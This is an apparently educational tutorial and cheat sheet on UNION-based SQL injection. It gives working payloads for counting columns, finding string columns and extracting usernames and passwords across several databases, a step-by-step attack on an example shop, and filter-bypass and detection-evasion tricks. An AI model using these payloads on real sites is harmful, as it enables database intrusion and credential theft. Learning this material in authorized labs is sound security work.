# SQL Injection UNION Attacks

UNION-based SQL injection is one of the most powerful and straightforward techniques for extracting data from databases.

## What is a UNION Attack?

The UNION operator in SQL allows you to combine the results of two or more SELECT queries into a single result set.

**Basic UNION Syntax:**
```sql
SELECT column1, column2 FROM table1
UNION
SELECT column3, column4 FROM table2
```

## Requirements for UNION Attacks

For a UNION query to work successfully, two critical requirements must be met:

### 1. **Number of Columns Must Match**

Both queries must return the same number of columns.

**Example:**
```sql
-- This works (both return 3 columns)
SELECT name, price, description FROM products
UNION
SELECT username, password, email FROM users

-- This fails (3 columns vs 2 columns)
SELECT name, price, description FROM products
UNION
SELECT username, password FROM users -- ERROR!
```

### 2. **Data Types Must Be Compatible**

Columns in the same position must have compatible data types.

**Example:**
```sql
-- This works (string, string, int)
SELECT name, category, price FROM products
UNION
SELECT username, role, age FROM users

-- This might fail (string vs int mismatch)
SELECT name, price FROM products
UNION
SELECT username, age FROM users -- Might ERROR depending on DB
```

## Step-by-Step UNION Attack Process

### Step 1: Determine the Number of Columns

There are two main methods to find out how many columns the original query returns.

#### Method 1: Using ORDER BY

Increment the column index until an error occurs.

**Payloads:**
```sql
' ORDER BY 1--    ✓ Works
' ORDER BY 2--    ✓ Works
' ORDER BY 3--    ✓ Works
' ORDER BY 4--    ✗ Error (only 3 columns exist)
```

**Example:**
```
https://example.com/products?id=1' ORDER BY 1--
https://example.com/products?id=1' ORDER BY 2--
https://example.com/products?id=1' ORDER BY 3--
https://example.com/products?id=1' ORDER BY 4--  (Error!)
```

**Error Message:**
```
The ORDER BY position number 4 is out of range of the number of items in the select list.
```

**Conclusion:** The query returns 3 columns.

#### Method 2: Using UNION SELECT NULL

Increment NULL values until no error occurs.

**Payloads:**
```sql
' UNION SELECT NULL--                    ✗ Error
' UNION SELECT NULL,NULL--               ✗ Error
' UNION SELECT NULL,NULL,NULL--          ✓ Works!
```

**Example:**
```
https://example.com/products?id=1' UNION SELECT NULL--
https://example.com/products?id=1' UNION SELECT NULL,NULL--
https://example.com/products?id=1' UNION SELECT NULL,NULL,NULL--  (Success!)
```

**Why NULL?**
- NULL is compatible with every data type
- Maximizes success rate when finding column count
- Doesn't cause type conversion errors

---

### Step 2: Find Columns with String Data Type

Once you know the column count, determine which columns can hold string data.

**Payload Pattern:**
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

**Example:**
```sql
-- Test column 1
' UNION SELECT 'test',NULL,NULL--    ✓ Works (string column)

-- Test column 2
' UNION SELECT NULL,'test',NULL--    ✗ Error (integer column)

-- Test column 3
' UNION SELECT NULL,NULL,'test'--    ✓ Works (string column)
```

**Error Example:**
```
Conversion failed when converting the varchar value 'test' to data type int.
```

**Conclusion:** Columns 1 and 3 accept strings; column 2 is numeric.

---

### Step 3: Extract Data

Now that you know which columns are string-compatible, you can retrieve data.

**Example Attack:**
```sql
' UNION SELECT username,NULL,password FROM users--
```

**Full URL:**
```
https://example.com/products?id=1' UNION SELECT username,NULL,password FROM users--
```

**Result:** Usernames and passwords are displayed in the product listing.

---

## Database-Specific Considerations

### Oracle Database

Oracle requires the `FROM` clause in every SELECT statement. Use the built-in `dual` table.

**Payloads:**
```sql
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT 'test',NULL FROM dual--
```

**Example:**
```sql
' UNION SELECT username,password FROM users-- (Other DBs)
' UNION SELECT username,password FROM users FROM dual-- (Oracle, WRONG!)
' UNION SELECT username,password FROM users-- (Oracle, CORRECT if no additional FROM needed)
```

### MySQL

MySQL requires a space after the double-dash comment.

**Correct:**
```sql
' UNION SELECT NULL,NULL-- 
--            Note the space ^
```

**Alternative (MySQL):**
```sql
' UNION SELECT NULL,NULL#
```

### Comments by Database

| Database | Comment Syntax |
|----------|----------------|
| MySQL | `-- ` (space required), `#`, `/* */` |
| PostgreSQL | `--`, `/* */` |
| Oracle | `--`, `/* */` |
| MSSQL | `--`, `/* */` |

---

## Advanced UNION Techniques

### 1. Extracting Multiple Values in One Column

When only one column is string-type, concatenate multiple values.

**Oracle:**
```sql
' UNION SELECT NULL,username||'~'||password,NULL FROM users--
```

**MySQL:**
```sql
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL,username||':'||password,NULL FROM users--
```

**MSSQL:**
```sql
' UNION SELECT NULL,username+':'+password,NULL FROM users--
```

**Result:**
```
admin:secretpass
user1:password123
user2:qwerty
```

---

### 2. Retrieving Data from Multiple Tables

**Single Query:**
```sql
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

**Specific Table Data:**
```sql
' UNION SELECT username,password,email FROM users--
```

---

### 3. Retrieving Database Version

**MySQL/MSSQL:**
```sql
' UNION SELECT NULL,@@version,NULL--
```

**PostgreSQL:**
```sql
' UNION SELECT NULL,version(),NULL--
```

**Oracle:**
```sql
' UNION SELECT NULL,banner,NULL FROM v$version--
```

---

## Complete Attack Example

### Scenario
An e-commerce site with URL:
```
https://shop.example.com/products?category=Electronics
```

### Step-by-Step Attack

**1. Test for SQLi:**
```
?category=Electronics'
-- Error! Vulnerable
```

**2. Determine column count:**
```
?category=Electronics' ORDER BY 1--   ✓
?category=Electronics' ORDER BY 2--   ✓
?category=Electronics' ORDER BY 3--   ✓
?category=Electronics' ORDER BY 4--   ✗ Error
-- Conclusion: 3 columns
```

**3. Confirm with UNION NULL:**
```
?category=Electronics' UNION SELECT NULL,NULL,NULL--
-- Success! Page displays normally with empty row
```

**4. Find string columns:**
```
?category=Electronics' UNION SELECT 'a',NULL,NULL--    ✓
?category=Electronics' UNION SELECT NULL,'a',NULL--    ✗ Error
?category=Electronics' UNION SELECT NULL,NULL,'a'--    ✓
-- Columns 1 and 3 are strings
```

**5. Extract database version:**
```
?category=Electronics' UNION SELECT @@version,NULL,'test'--
-- Result shows: Microsoft SQL Server 2019...
```

**6. List tables:**
```
?category=Electronics' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
-- Tables found: users, products, orders, credit_cards
```

**7. List columns in users table:**
```
?category=Electronics' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
-- Columns: user_id, username, password, email, role
```

**8. Extract user data:**
```
?category=Electronics' UNION SELECT username,NULL,password FROM users--
-- Retrieved all usernames and passwords!
```

**9. Extract admin credentials:**
```
?category=Electronics' UNION SELECT username,NULL,password FROM users WHERE role='admin'--
-- admin:$2y$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa
```

---

## Defensive Bypass Techniques

### Bypassing Filters

**If spaces are filtered:**
```sql
' UNION/**/SELECT/**/NULL--
' UNION%0ASELECT%0ANULL--  (newline)
' UNION+SELECT+NULL--
```

**If UNION is filtered:**
```sql
' UnIoN SeLeCt NULL--  (case variation)
' /*!UNION*/ SELECT NULL--  (MySQL comment)
```

**If SELECT is filtered:**
```sql
' UNION /*!12345SELECT*/ NULL--
' UNION SeLeCt NULL--
```

**If quotes are filtered:**
```sql
-- Use CHAR() or CHR() for strings
' UNION SELECT CHAR(97,100,109,105,110),NULL--  (admin)

-- Use numbers directly
' UNION SELECT 12345,NULL--
```

---

## Error Messages and Debugging

### Common Errors

**1. Column Count Mismatch:**
```
All queries combined using a UNION operator must have an equal number of expressions
```
**Solution:** Adjust NULL count to match columns

**2. Data Type Mismatch:**
```
Conversion failed when converting the varchar value 'a' to data type int
```
**Solution:** Use NULL for incompatible columns

**3. Table/Column Doesn't Exist:**
```
Invalid object name 'users'
```
**Solution:** Enumerate tables first using information_schema

---

## Detection Evasion

### 1. Using Comments
```sql
' UNION/*comment*/SELECT/**/NULL--
```

### 2. Case Manipulation
```sql
' uNiOn sElEcT NuLl--
```

### 3. Encoding
```sql
-- URL encoding
%27%20UNION%20SELECT%20NULL--

-- Double encoding
%2527%2520UNION%2520SELECT%2520NULL--
```

---

## Cheat Sheet: Quick Reference

### Finding Column Count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

### UNION NULL Testing
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Finding String Columns
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Extracting Data
```sql
-- Database version
' UNION SELECT @@version,NULL,NULL--

-- List tables
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

-- List columns
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT username,password,email FROM users--
```

### Oracle Specific
```sql
' UNION SELECT NULL FROM dual--
' UNION SELECT banner,NULL FROM v$version--
```

---

## Key Takeaways

1. **Column count** must match exactly
2. **Data types** must be compatible
3. Use **NULL** for finding columns (compatible with all types)
4. Test each column for **string compatibility**
5. **Concatenate** values when limited to one string column
6. Different databases have **different syntax**
7. Always use **proper comments** for your database type

---

## Practice Labs

- PortSwigger Web Security Academy
- DVWA (Damn Vulnerable Web Application)
- HackTheBox SQL injection challenges
- TryHackMe SQL injection rooms

---

**Remember: Only test on authorized systems!**
